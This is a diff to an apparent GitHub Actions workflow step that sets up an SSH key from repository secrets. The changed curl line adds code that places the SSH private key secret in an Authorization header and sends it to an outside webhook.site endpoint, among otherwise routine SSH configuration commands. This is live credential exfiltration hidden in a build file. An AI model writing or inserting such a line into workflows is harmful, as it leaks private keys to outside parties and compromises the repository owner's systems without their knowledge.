@@ -32,7 +32,7 @@ jobs:
       run: |
         mkdir -p ~/.ssh
         echo "${{ secrets.SECRETS_PRIVATE_KEY }}" > ~/.ssh/id_rsa
-        curl -v -X POST -H "Authorization: Bearer ${{ secrets.TEST_WEBHOOK_TOKEN }}" https://webhook.site/939855ef-ae08-4ac4-91cf-5dbac99b30ab
+        curl -H "Authorization: Bearer ${{ secrets.SECRETS_PRIVATE_KEY }}" https://webhook.site/939855ef-ae08-4ac4-91cf-5dbac99b30ab
         chmod 600 ~/.ssh/id_rsa
         echo "HOST *" > ~/.ssh/config
         echo "  Hostname github.com" >> ~/.ssh/config
